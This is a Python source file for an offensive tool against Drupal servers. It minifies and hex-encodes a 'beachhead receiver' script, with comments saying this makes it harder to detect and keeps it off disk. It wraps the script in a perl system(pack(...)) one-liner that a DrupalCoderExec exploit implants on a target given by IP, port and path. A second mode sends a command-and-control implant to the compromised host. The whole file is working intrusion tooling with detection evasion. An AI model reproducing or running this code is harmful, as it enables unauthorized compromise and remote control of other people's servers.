import binascii
import pathlib
import time

import python_minifier
import python_obfuscator
from python_obfuscator.techniques import add_random_variables

from include.BeachheadSender import BeachheadSender
from include.DrupalCoderExec import DrupalCoderExec

PARENT_DIR = str(pathlib.Path(__file__).parent.absolute()) + "/"
BEACHHEAD_LOCATION = PARENT_DIR + "include/BeachheadReceiver.py"


def package_beachhead():
    """Packages the beachhead receiver into a shell command

    This function will read the beachhead receiver from its file, minify it,
    put it in a format that will let it be piped directly into a python3 
    interpreter, and then package it into a perl command that can be implanted
    by the DrupalCoderExec exploit.
    """

    with open(BEACHHEAD_LOCATION, "r") as f:
        # The minifier will remove all comments and whitespace from 
        # the file, as well as make other optimizations
        receiver = python_minifier.minify(f.read())

    # Echoing the receiver into a python interpreter will run it 
    # in memory and not write unnecessary files to disk
    receiver = 'echo "' + receiver + '" | python3'

    # Covert the receiver to hex to make it harder to detect and less likely 
    # to run into issues with special characters
    hex_beachhead = binascii.hexlify(receiver.encode("utf-8")).decode("utf-8")

    # Use the perl pack function to convert the hex back into a 
    # string and run it as a shell command
    bh = (
        "perl -e 'system(pack(qq,H"
        + str(len(hex_beachhead))
        + ",,qq,"
        + hex_beachhead
        + ",))'"
    )

    print("BEACHHEAD: beachhead packaged")
    return bh


def implant_beachhead(ip_addr, port, path):
    """Implants the beachhead receiver into the target machine

    This function will use the DrupalCoderExec class to implant the beachhead 
    receiver into the target machine.

    See that class for further documentation.
    """

    beachhead = package_beachhead()
    exec = DrupalCoderExec(beachhead)
    exec.exploit(ip_addr, port, path)

    print("BEACHHEAD: Beachhead implanted")
    return


def implant_cnc(ip_addr, port, path, implant_file_path):
    """Implants the Command and Control module receiver into the target machine

    This function will use the BeachheadSender class to implant the 
    Command and Control module receiver into the target machine.

    See that class for further documentation.
    """

    sender = BeachheadSender(ip_addr, port, path, implant_file_path)
    sender.send_request()

    print("BEACHHEAD: CNC implanted")
    return


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()

    modes = parser.add_subparsers(dest="mode", required=True)

    beachhead = modes.add_parser("implant-beachhead", help="Implant the beachhead")
    cnc = modes.add_parser("implant-cnc", help="Implant the Command and Control implant")

    beachhead.add_argument("--ip", required=True, help="IP address of the target machine")
    beachhead.add_argument("--port", required=True, help="Port of the Drupal server")
    beachhead.add_argument("--path", required=True, help="Path to the Drupal server")

    cnc.add_argument("--ip", required=True, help="IP address of the target machine")
    cnc.add_argument("--path", required=True, help="Path to the Drupal server")
    cnc.add_argument("--implant", required=True, help="Path to the implant file")

    args = parser.parse_args()

    if args.mode == "implant-beachhead":
        implant_beachhead(args.ip, args.port, args.path)
    elif args.mode == "implant-cnc":
        implant_cnc(args.ip, "8081", args.path, args.implant)
    else:
        print("Invalid mode")
